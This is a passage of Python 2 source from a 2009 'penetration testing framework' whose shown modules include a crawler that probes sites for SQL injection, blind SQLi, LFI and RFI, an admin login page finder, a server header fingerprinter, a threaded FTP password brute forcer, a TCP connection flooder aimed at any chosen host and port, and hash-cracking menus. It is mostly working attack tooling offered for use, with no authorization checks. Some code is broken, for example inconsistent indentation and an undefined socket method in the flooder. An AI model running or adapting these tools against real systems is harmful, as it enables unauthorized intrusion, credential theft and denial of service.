			for l in links: 
				z=z+1
				if z>50:
					sys.exit(1)
			        if mode=='-sqli':
					z=z+1
			         	if z>50:
				        	sys.exit(1)
					htmlsqli=""
					nemu="no"
					tipe=""
				         
					if samadengan in l and tanya in l:
						if mywisdom not in l:
			        		       l2=l+ceksqli
			    		               if site not in l2:
							        l2=site+slash+l2
			                       
		        	                else :
						       if site in l:
							       l2=l+ceksqli
					        print "[-]Checking sqli at:"+l2     
					        response=urllib.urlopen(l2)
		                	        htmlsqli = response.read()   
						
					if mysqli1 in htmlsqli:
						nemu="yes"
						tipe="mysql injection"
				        elif mysqli2 in htmlsqli:
					       	nemu="yes"
						tipe="mysql injection"
					elif mysqli3 in htmlsqli:
					       	nemu="yes"
						tipe="mysql injection (error fetching array)"
					elif mysqli4 in htmlsqli:
					       	nemu="yes"
						tipe="oop application bug"
				 
					elif accesqli1 in htmlsqli:
						nemu="yes"
						tipe="ms access sql injection"
			        	
					elif accesqli2 in htmlsqli:
						nemu="yes"
						tipe="ms access sql injection"
				        	
					elif mssqli1 in htmlsqli:
						nemu="yes"
						tipe="mssql injection"
			        	
					elif mssqli2 in htmlsqli:
						nemu="yes"
						tipe="mssql injection"
			        	
					elif oracle in htmlsqli:
						nemu="yes"
						tipe="oracle sql injection"
			        	
					elif mscfm in htmlsqli:
						nemu="yes"
						tipe="cfm mssql injection"
		        	
					elif general in htmlsqli:
						nemu="yes"
						tipe="unidentified sql injection"
			        	
					if nemu=='yes':
						print "[+]W00t !! Found "+ tipe+ " Bug at:"+l2
						print "[+]Possible server's hole saved at webscan.txt"
						filelog = open(log, "a")
						filelog.write ("\n[+]W00t !! Found "+ tipe+ " Bug at:"+l2) 
			                #tes path disclosure
					tahap2=l2.split('=')
					lx=tahap2[0]+sat_ahyar+ceksqli
					if tanya in lx and z<3:
					  print "[--]checking error request at:"+lx
					  response=urllib.urlopen(lx)
					  htmlsqli = response.read()   
				
					  if mysqli1 in htmlsqli:
						nemu="yes"
						tipe="mysql injection"
				          elif mysqli2 in htmlsqli:
					       	nemu="yes"
						tipe="mysql injection"
		        	
				  	  elif accesqli1 in htmlsqli:
						nemu="yes"
						tipe="ms access sql injection"
			        	
					  elif accesqli2 in htmlsqli:
						nemu="yes"
						tipe="ms access sql injection"
		        	
					  elif mssqli1 in htmlsqli:
						nemu="yes"
						tipe="mssql injection"
			        	
					  elif mssqli2 in htmlsqli:
						nemu="yes"
						tipe="mssql injection"
		        	
					  elif oracle in htmlsqli:
						nemu="yes"
						tipe="oracle sql injection"
	        	
					  elif mscfm in htmlsqli:
						nemu="yes"
						tipe="cfm mssql injection"
		        	
					  elif general in htmlsqli:
						nemu="yes"
						tipe="unidentified sql injection"
		        
					  elif gajebo in htmlsqli:
						nemu="yes"
						tipe="unidentified error message"
		        
					  elif pathdisclosure1 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path discosure /home/"
					  elif pathdisclosure2 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /var/"
					  elif pathdisclosure3 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /www/"
					  elif pathdisclosure4 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /html/"
					  elif pathdisclosure5 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /usr/"
					  elif pathdisclosure6 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /user/"
					  elif pathdisclosure7 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /sites/"
					  elif pathdisclosure8 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /mnt/"
					  elif pathdisclosure9 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /etc/"
					  elif pathdisclosure10 in htmlsqli and penghubung in htmlsqli:
						nemu="yes"
						tipe="path disclosure /web/"
			
		
	        	
					  if nemu=='yes':
						print "[+]W00t !! Found "+ tipe+ " Bug at:"+lx
						print "[+]Possible server's hole saved at webscan.txt"
						filelog = open(log, "a")
						filelog.write ("\n[+]W00t !! Found "+ tipe+ " Bug at:"+lx) 
			
		
				elif mode=='-blind':
					z=z+1
        			 	if z>50:
		     	   			sys.exit(1)
					nemu="no"
					l1=urlbuta
					l100=urlbuta
					if samadengan in l:
						if mywisdom not in l:
				        	       l1=l+cekblind1
					               if site not in l1:
							        l1=site+slash+l1
						       l100=l+cekblind100
					               if site not in l100:
							        l100=site+slash+l100
		        	                else :
						       if site in l:
							       l1=l+cekblind1
							       l100=l+cekblind100
					        print "[-]Saving response length for blind sqli at :"+l1     
				        	response=urllib.urlopen(l1)
                		        	cacheblind1 = response.read()
				        	print "[-]Saving response length for blind sqli at :"+l100     
				        	response=urllib.urlopen(l100)
        		                	cacheblind100 = response.read()
						panjangblind1=len(cacheblind1)
						panjangblind100=len(cacheblind100)
						if panjangblind1!=panjangblind100:
							print "[+]W00t !! Found Possible Blind sqli Bug at:"+l100
							print "[+]Possible server's hole saved at webscan.txt"
							filelog = open(log, "a")
						        filelog.write ("\n[+]W00t !! Found Possible Blind sqli Bug at:"+l100) 
						else:
							print "[-]Sorry no possible blind found here !"
		   	
		   
		   
		   
				elif mode=='-lfi':
				      z=z+1
				      if z>50:
		        			sys.exit(1)
	              		      for ceklfi in lfis:  
	                 		htmllfi="alabala ngentot akun darkc0denya udah gw 0wned hahahaha"
			 
			 		if samadengan in l:
        	         		   	if mywisdom not in l:
						       beforelfi=l.split('=')
						       pj=len(beforelfi)
        	                		       da=0
        	                		       kont=""
						       for x in beforelfi:
							    da=da+1
               	                       			    if da<pj:
	       	                       				kont=kont+x+"="	
	
					               lfi=kont+ceklfi
					               if site not in lfi:
							        lfi=site+slash+lfi
			                       
                	        		else :
						       if site in l:
					           
					          
					       			beforelfi=l.split('=')
				               			pj=len(beforelfi)
                        	               			da=0
                        	               			kont=""
				               			for x in beforelfi:
                        	                	   		da=da+1
                        	                	   		if da<pj:
					         	   			kont=kont+x+"="
					       			lfi=kont+ceklfi
				        	if lfi!="":
		        			   print "[-]Checking lfi at:"+lfi     
		        	   		try:
				   		   response=urllib.urlopen(lfi)
				      		   htmllfi = response.read()   
				   		except(IOError),msg: 
                        	   		   print "Error in testing url: ", lfi
                        	   		   print msg 
						if myroot in htmllfi:
				      				print "[+]W00t !! Found lfi Bug at:"+lfi
		                 				print "[+]Possible server's hole saved at webscan.txt"
				                		filelog = open(log, "a")
								filelog.write ("\n[+]W00t !! Found lfi Bug at:"+lfi) 
					if samadengan in l:
							if mywisdom not in l:
			               				lfi=l
			              				if site not in lfi:
					        			lfi=site+slash+lfi
			                       
                	        			else :
				        			if site in l:
					       				lfi=l
					       
		        				tahap3=lfi.split('=')
							lfix=tahap3[0]+samadengan+ceklfi
							if tanya in lfix:
			        	   	   		print "[--]checking lfi at:"+lfix
			    	
	                    			    	try:
							      response=urllib.urlopen(lfix)
							      htmllfi = response.read()   
							except(IOError),msg: 
	                        			      print "Error in testing url: ", lfix
        	                			      print msg 
				      
			        			if myroot in htmllfi:
				      					print "[+]W00t !! Found lfi Bug at:"+lfix
	        	         					print "[+]Possible server's hole saved at webscan.txt"
				 			       	        filelog = open(log, "a")
									filelog.write ("\n[+]W00t !! Found lfi Bug at:"+lfix) 
	        	  		 	
		      	 
				elif mode=='-rfi':
					z=z+1
         				if z>50:
		        			sys.exit(1)
					htmlrfi="alabala ngentot akun darkc0denya udah gw 0wned hahahaha"
					if samadengan in l:
        	            			if mywisdom not in l:
						       beforerfi=l.split('=')
						       pj=len(beforerfi)
		                	               da=0
        		                	       kont=""
					   	       for x in beforerfi:
							    da=da+1
		                               	     	    if da<pj:
			                        	    	kont=kont+x+"="

					               rfi=kont+cekrfi
					               if site not in rfi:
							        rfi=site+slash+rfi
		        	               
			                        else :
						       if site in l:
					           
				          
							       beforerfi=l.split('=')
						               pj=len(beforerfi)
	                        		               da=0
			                                       kont=""
						               for x in beforerfi:
        	                		                   da=da+1
        	                                		   if da<pj:
							         	   kont=kont+x+"="
							       rfi=kont+cekrfi
			        		if rfi!="":
			           			print "[-]Checking rfi at:"+rfi     
			           			try:
				      			   response=urllib.urlopen(rfi)
				      			   htmlrfi = response.read()   
				   			except(IOError),msg: 
		        	                      	   print "Error in testing url: ", rfi
                			              	   print msg 
						if anjing in htmlrfi:
			      					print "[+]W00t !! Found rfi Bug at:"+rfi
		                 				print "[+]Possible server's hole saved at webscan.txt"
				                		filelog = open(log, "a")
								filelog.write ("\n[+]W00t !! Found rfi Bug at:"+rfi) 
			
					if samadengan in l:
						if mywisdom not in l:
			               			rfi=l
			               			if site not in rfi:
					        		rfi=site+slash+rfi
			                       
        	                		else :
				       			if site in l:
					       			rfi=l
					       
					        tahap3=rfi.split('=')
						rfix=tahap3[0]+samadengan+cekrfi
						if tanya in rfix:
					              print "[--]checking rfi at:"+rfix
				    
                			        try:
						      response=urllib.urlopen(rfix)
						      htmlrfi = response.read()   
						except(IOError),msg: 
		                	              print "Error in testing url: ", rfix
		                	              print msg 
						      
					        if anjing in htmlrfi:
						      		print "[+]W00t !! Found rfi Bug at:"+rfix
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
			        	         		
	
def foot():
	#!/usr/bin/python
	import urllib2, string, sys, os, httplib, socket 
	global anony,hacking
	def saw6(target):
	
		if target != 0:
			h = httplib.HTTP(anony)
			h.putrequest("GET", "http://"+target)
		else:
			h = httplib.HTTP(target[:-1])
			h.putrequest("HEAD")
		h.putheader("Host", target)
		h.endheaders()
		okresp, reason, headers = h.getreply()
		return okresp, reason, headers.get("Server")
	
	def fun(op): 
		global a, b, c, d, e, f, g, h, i, j, k 
		sal = urllib2.Request(op) 
		url_handle = urllib2.urlopen(sal) 
		reqq = url_handle.info() 
 
		ashu = str(reqq).replace('\r','') 
		salman = ashu.split('\n') 
		for gost in range(0, len(salman)): 
			if 'Date:' in salman[gost]: 
				a = salman[gost].split('Date: ')[1] 
			if 'Server:' in salman[gost]: 
				b = salman[gost].split('Server: ')[1] 
			if 'Accept-Ranges:' in salman[gost]: 
				c = salman[gost].split('Accept-Ranges: ')[1] 
			if 'Vary:' in salman[gost]: 
				d = salman[gost].split('Vary: ')[1] 
			if 'Content-Length:' in salman[gost]: 
				e = salman[gost].split('Content-Length: ')[1] 
			if 'Connection:' in salman[gost]: 
				f = salman[gost].split('Connection: ')[1] 
			if 'Content-Type:' in salman[gost]: 
				g = salman[gost].split('Content-Type: ')[1] 
			if 'Expires:' in salman[gost]: 
				h = salman[gost].split('Expires: ')[1] 
			if 'Set-Cookie:' in salman[gost]: 
				i = salman[gost].split('Set-Cookie: ')[1] 
			if 'Transfer-Encoding:' in salman[gost]: 
				fpTC = salman[gost].split('Transfer-Encoding: ')[1] 
			if 'Cache-Control:' in salman[gost]: 
				k = salman[gost].split('Cache-Control: ')[1] 
		baser = { 'Date:-': a, 
			    'Server:-': b, 
			    'Accept-Ranges:-': c, 
			    'Vary:-': d, 
			    'Content-Lenght:-': e, 
			    'Connection:-': f, 
			    'Content-Type:-': g, 
			    'Expires:-': h, 
			    'Set-Cookie:-': i, 
			    'Transfer-Encoding:-': j, 
			    'Cache-Control:-': k } 
		xss_file = open(hacking, "a")
		xss_file.writelines("\n\t\t#################################################\n")
		xss_file.writelines("\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #\n") 
		xss_file.writelines("\t\t#    Copyright (C) 2009 By Ashikali             #\n")
		xss_file.writelines("\t\t#    WEB SERVER IDENTIFIER  Report              #\n")
		xss_file.writelines("\t\t#    Ashikali1208[at]yahoo[dot]com              #\n")                                
		xss_file.writelines("\t\t#    www.Ashikali.com                           #\n") 
		xss_file.writelines("\t\t#    GNU General Public License                 #\n")
		xss_file.writelines("\t\t#################################################\n")
		xss_file.writelines("\t\t            Target Is ")
		xss_file.write(usrop)
		xss_file.writelines("\n\t\t----------------------------------------------------\n\n")
		for secondgost, value in baser.items(): 
			print "\n\t[-]",secondgost, value 
			xss_file.write("\n\t[-]")
			xss_file.write(secondgost)
			xss_file.write(value)
		sending_back_to_cilage=raw_input("\n\tPress Any key To Going Back...")
 
	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali             #"
		print "\t\t#    WEB SERVER IDENTIFIER                      #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                 
		print "\t\t#    www.Ashikali.com                           #" 
		print "\t\t#    GNU General Public License                 #"
		print "\t\t#################################################"
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter which Operation You Want To Perform---> ")	
		if cho == '2': 
			hlpserver()	
		elif cho == '1': 
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			usrop = raw_input("\nEnter your Target Site Here : ") 
			print "\n[+] Target",usrop,"is loded Sucsesfully"
			print "[+] Fetching Serverinfo From Target"
			print "---------------------------------------" 
			if usrop.startswith('http'): 
				if anony != 0:
					saw6(usrop)	
					fun(usrop) 
				else:
					fun(usrop)
			else: 
				if anony != 0:
					saw6(usrop)
					fun('http://'+usrop)
				else:
					fun('http://'+usrop)
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
def ftp():
	#!/usr/bin/python
	import threading, time, random, sys, ftplib, os
	from ftplib import FTP
	from copy import copy
	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali             #"
		print "\t\t#    FTP BRUTE FORCER                           #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
		print "\t\t#    www.Ashikali.com                           #" 
		print "\t\t#    GNU General Public License                 #"
		print "\t\t#################################################"
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
		if cho == '2':
			hlpftp()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			t=raw_input("\n\nEnter The Target Here  : ")
			u=raw_input("\nEnter The User Txt File Here  : ")
			username = open(u, "r").readlines()
			w=raw_input("\nEnter The Password Txt File Here  : ")
			passwords = open(w, "r").readlines()
			print "\n[+] Server Loded:",t
			print "\n[+] User Data File Loded:",u
			print "\n  [-] Total Username:",len(username)
			print "\n[+] Password File Loded:",w
			print "\n  [-] Total passwords:",len(passwords),"\n"
			try:
				foo = FTP(t)
				print "[+]Target Found:",foo.getwelcome()
			except (ftplib.all_errors):
				pass
			try:
				print "\n  [-]First Will Checking For Anonymous FTP Login"
				ftp = FTP(t)
				ftp.login()
				ftp.retrlines('LIST')
				print "\n    [--]Vulnarablity Found Anonymous Login successfuly Done...\n"
				ftp.quit()
			except (ftplib.all_errors): 
				print "\n    [--]Anonymous Login Unsuccessful..."
				print "\n[+]Trying Bruteforcing on target : ",t
			testlist = copy(passwords)

			def lopero():
				for te in testlist:
					passwords.append(te)
	
			def fetihing():
				lock = threading.Lock()
				lock.acquire()
				if len(passwords) != 0:
					value = random.sample(passwords,  1)
					passwords.remove(value[0])		
				else:
					print "\n Testing On another User \n"
					lopero()
					value = random.sample(passwords,  1)
					username.remove(username[0])
		
				lock.release()
				if len(username) ==1:
					return value[0][:-1], username[0]
				else:
					return value[0][:-1], username[0][:-1]
		
			class distr(threading.Thread):
				def run(self):
					value, user = fetihing()
					try:
						print "-"*52
						print "User:",user,"psswords:",value
						ftp = FTP(t)
						ftp.login(user, value)
						ftp.retrlines('LIST')
						print "\t\n Woot! Woot! Login successful"
						print "\nusername : ",user,"password : ",value
						ftp.quit()
					except (ftplib.all_errors), msg: 
						#print "Found Error"
						pass
			for jena in range(len(passwords)*len(username)):
				robot = distr()
				robot.start()
				time.sleep(1)	
			
			sending_back_to_Vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")


def babydol():

	#!/usr/bin/python
	import socket, string, random, time, thread, os
	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t\t#################################################"
		print "\t\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE  #" 
		print "\t\t#    Copyright (C) 2009 By Ashikali             #"
		print "\t\t#    TARGET  FLODING [DOS]                      #" 
		print "\t\t#    Ashikali1208[at]yahoo[dot]com              #"                                
		print "\t\t#    www.Ashikali.com                           #" 
		print "\t\t#    GNU General Public License                 #"
		print "\t\t#################################################"
		print "\n\t\tEnter 1 For Contineue "
		print "\n\t\tEnter 2 For Help Or Detail"
		print "\n\t\tEnter 3 For For Exit From Current Menu"
		cho = raw_input("\n\t\tEnter Which Operation You Want To Perform---> ")	
		if cho == '2':
			hlpdos()
		elif cho == '1':
			def jigar(i):
    				try:
        				salman1 = socket(AF_INET, SOCK_STREAM)
        				salman1.jigar((t, ashu))
        				sleep(99999)
        				salman1.close
    				except:
        				print "\t[+]Flooding The Target"
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			t = raw_input("Enter The Target: ")
			ashu = input("\nEnter The Flooding Port: ")
			print "\n[+] Target",t,"is Loded Sucsesfully"
			print "\n[+] Target Port",ashu,"Is Loded"
			print "\nAre You Sure You Want To Attack ????"
			bade=raw_input("\nPress Any Key For Conteneue.....")
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			love = 0
			while 1:
				try:
					start_new_thread(jigar, (love,))
				except:
					print "\t[-] Host is Not Rechable... Trying Again..."
				print "\t[-] Sending Packets on Target",t,"Using Port",ashu
				print "\t[-] Press CNTR + C For Stop The Attack & Exit From Framework"
				sleep(0.1)
		
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
def adf():
	#/usr/bin/python

	import sys, os, time, httplib
	global wol
	cho = '1'
	while ( cho != '3' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t############################################################"
		print "\t#    PENETRATION TESTING FRAMEWORK PRE RELEASE             #" 
		print "\t#    Copyright (C) 2009 By Ashikali                        #"
		print "\t#    LOGIN PAGE FINDER FOR [PHP, CFM, ASP, ASPX, JSP]      #" 
		print "\t#    Ashikali1208[at]yahoo[dot]com                         #"                                
		print "\t#    www.Ashikali.com                                      #" 
		print "\t#    GNU General Public License                            #"
		print "\t############################################################"
		print "\n\tEnter 1 For Contineue "
		print "\n\tEnter 2 For Help Or Detail"
		print "\n\tEnter 3 For Exit From Current Menu"
		cho = raw_input("\n\tEnter Which Operation You Want To Perform---> ")	
		if cho == '2':
			hlplogin()
		elif cho == '1':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			fun=raw_input("\n\nEnter The Target Website Here : ")
			ashu = fun.replace("http://","").rsplit("/",1)[0] 
			ashu = ashu.lower()
			print "\n[++] Target Website:",ashu
			print "\n[++] Payload Loded..."
			print "\n\t[+] Start Testing paths..."
			print

			try:
				for sal in wol:
					sal = sal.replace("\n","")
					sal = "/" + sal
					jen = httplib.HTTPConnection(ashu)
					jen.request("GET",sal)
					love = jen.getresponse()
					print "\n\t\t[-] http://%s%s %s %s" % (ashu, sal, love.status, love.reason)	
			except(KeyboardInterrupt,SystemExit):
					raise
			except:
					pass	
			sending_back_to_vilage=raw_input("\n\tPress Any key For Going Back...")	
		elif cho == '3':
			break
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")

def indonasia():
	
	global anony, myip
	myip = socket.gethostbyaddr(socket.gethostname())[2]
	choice= '1'
	while ( choice != '6' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
		print "\n\t#################################################"
		print "\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
		print "\t#  Copyright (C) 2009 By Ashikali               #"
		print "\t#  ATTACKING sYSTEM                             #" 
		print "\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
		print "\t#  www.Ashikali.com                             #" 
		print "\t#  GNU General Public License                   #"
		print "\t#################################################"
		print "\n\tEnter 1 For Flooding The Target "
		print "\n\tEnter 2 for Syn Flooding" 
		print "\n\tEnter 3 for DNS Flooding"
		print "\n\tEnter 4 For Help Of This Task "
		print "\n\tEnter 5 For Exit From Current Menu"
		print "\n\tEnter 6 For Exit Completly"
		if anony == 0:
			print "\n\tYou Are using This Tool By Ip",myip	
		else:
			print "\n\tNOTE:- Currently You Are Using Proxy",anony
		choice = raw_input("\n\tEnter Your Choice Here : ")
		if choice == '1':
			babydol()
		elif choice == '2':
			smt()
		elif choice == '3':
			cpn()
		elif choice == '4':
			worldp()
		elif choice == '5':
				break
		elif choice == '6':
			if os.name == "posix":
				# Unix/Linux/MacOS/BSD/etc
				os.system('clear')
			elif os.name in ("nt", "dos", "ce"):
				# DOS/Windows
				os.system('CLS')
			print "\n\t\t#################################################"
			print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
			print "\t\t#  Copyright (C) 2009 By Ashikali               #"
			print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #" 
			print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
			print "\t\t#  www.Ashikali.com                             #" 
			print "\t\t#  GNU General Public License                   #"
			print "\t\t#################################################"
			print "\n\t\t   Thanks For Using My Tool Hope You Like This"
			print "\t\t-------------------------------------------------"
			sys.exit(1) 
		else: 
			bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")

		
def encrbhutan():
	global anony, myip, algo,jamrukh, dadam
	myip = socket.gethostbyaddr(socket.gethostname())[2]
	cho = '1'
	while ( cho != '11' ):
		if os.name == "posix":
			# Unix/Linux/MacOS/BSD/etc
			os.system('clear')
		elif os.name in ("nt", "dos", "ce"):
			# DOS/Windows
			os.system('CLS')
			print "\n\t\t#################################################"
			print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE    #" 
			print "\t\t#  Copyright (C) 2009 By Ashikali               #"
			print "\t\t#  HACKING ANYWAY FRAMEWORK V 1.0               #" 
			print "\t\t#  ENCRYPTION SECTION                           #"
			print "\t\t#  Ashikali1208[at]yahoo[dot]com                #"                                   
			print "\t\t#  www.Ashikali.com                             #" 
			print "\t\t#  GNU General Public License                   #"
			print "\t\t#################################################"
			print "\n\t\tEnter 1 For Cracking MD5 Hash "
			print "\n\t\tEnter 2 For Cracking sha1 Hash "
			print "\n\t\tEnter 3 For Cracking sha256 Hash "
			print "\n\t\tEnter 4 For Cracking sha384 Hash "
			print "\n\t\tEnter 5 For Cracking sha512 Hash "
			print "\n\t\tEnter 6 For Encode Base 64 String "
			print "\n\t\tEnter 7 For Decode Base 64 String"
			print "\n\t\tEnter 8 For Cracking MYSQL Hash "
			print "\n\t\tEnter 9 For Help Of This Task "
			print "\n\t\tEnter 10 For Exit From Current Menu"
			print "\n\t\tEnter 11 For Exit Completly"
			cho = raw_input("\n\t\tenter which op u wana perform---> ")
			if cho == '1':
				cho ='0'
				while ( cho != '3' ):
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					print "\n\t\t##############################################"
					print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
					print "\t\t#  Copyright (C) 2009 By Ashikali            #"
					print "\t\t#  MD5 CRACKER                               #" 
					print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
					print "\t\t#  www.Ashikali.com                          #" 
					print "\t\t#  GNU General Public License                #"
					print "\t\t##############################################"
					print "\n\t\tEnter 1 For For Contineue "
					print "\n\t\tEnter 2 For Help Or Detail"
					print "\n\t\tEnter 3 For Exit From Current Menu"
					cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
					if cho == '2':
						hlphttp()	
					elif cho == '1':
						if os.name == "posix":
							# Unix/Linux/MacOS/BSD/etc
							os.system('clear')
						elif os.name in ("nt", "dos", "ce"):
							# DOS/Windows
							os.system('CLS') 
						algo='md5'
						hshorb()
					elif cho == '3':
						break
					else: 
						bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
	
			elif cho == '2':
				cho ='0'
				while ( cho != '3' ):
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					print "\n\t\t##############################################"
					print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
					print "\t\t#  Copyright (C) 2009 By Ashikali            #"
					print "\t\t#  SHA 1 CRACKER                             #" 
					print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
					print "\t\t#  www.Ashikali.com                          #" 
					print "\t\t#  GNU General Public License                #"
					print "\t\t##############################################"
					print "\n\t\tEnter 1 For For Contineue "
					print "\n\t\tEnter 2 For Help Or Detail"
					print "\n\t\tEnter 3 For Exit From Current Menu"
					cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
					if cho == '2':
						hlphttp()	
					elif cho == '1':
						if os.name == "posix":
							# Unix/Linux/MacOS/BSD/etc
							os.system('clear')
						elif os.name in ("nt", "dos", "ce"):
							# DOS/Windows
							os.system('CLS') 
						algo='sha1'
						hshorb()
					elif cho == '3':
						break
					else: 
						bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
				
			elif cho == '3':
				cho ='0'
				while ( cho != '3' ):
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					print "\n\t\t##############################################"
					print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
					print "\t\t#  Copyright (C) 2009 By Ashikali            #"
					print "\t\t#  SHA 256 CRACKER                           #" 
					print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
					print "\t\t#  www.Ashikali.com                          #" 
					print "\t\t#  GNU General Public License                #"
					print "\t\t##############################################"
					print "\n\t\tEnter 1 For For Contineue "
					print "\n\t\tEnter 2 For Help Or Detail"
					print "\n\t\tEnter 3 For Exit From Current Menu"
					cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
					if cho == '2':
						hlphttp()	
					elif cho == '1':
						if os.name == "posix":
							# Unix/Linux/MacOS/BSD/etc
							os.system('clear')
						elif os.name in ("nt", "dos", "ce"):
							# DOS/Windows
							os.system('CLS') 
						algo='sha256'
						hshorb()
					elif cho == '3':
						break
					else: 
						bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
				
			elif cho == '4':
				cho ='0'
				while ( cho != '3' ):
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
					elif os.name in ("nt", "dos", "ce"):
						# DOS/Windows
						os.system('CLS')
					print "\n\t\t##############################################"
					print "\t\t#  PENETRATION TESTING FRAMEWORK PRE RELEASE #" 
					print "\t\t#  Copyright (C) 2009 By Ashikali            #"
					print "\t\t#  SHA 384 CRACKER                           #" 
					print "\t\t#  Ashikali1208[at]yahoo[dot]com             #"                                
					print "\t\t#  www.Ashikali.com                          #" 
					print "\t\t#  GNU General Public License                #"
					print "\t\t##############################################"
					print "\n\t\tEnter 1 For For Contineue "
					print "\n\t\tEnter 2 For Help Or Detail"
					print "\n\t\tEnter 3 For Exit From Current Menu"
					cho = raw_input("\n\t\tEnter Which Operation You Want to Perform---> ")	
					if cho == '2':
						hlphttp()	
					elif cho == '1':
						if os.name == "posix":
							# Unix/Linux/MacOS/BSD/etc
							os.system('clear')
						elif os.name in ("nt", "dos", "ce"):
							# DOS/Windows
							os.system('CLS') 
						algo='sha384'
						hshorb()
					elif cho == '3':
						break
					else: 
						bo=raw_input("\n\t\tWoops !!! Invalid Choice Press Any Key For Enter Again...")
				
			elif cho == '5':
				cho ='0'
				while ( cho != '3' ):
					if os.name == "posix":
						# Unix/Linux/MacOS/BSD/etc
						os.system('clear')
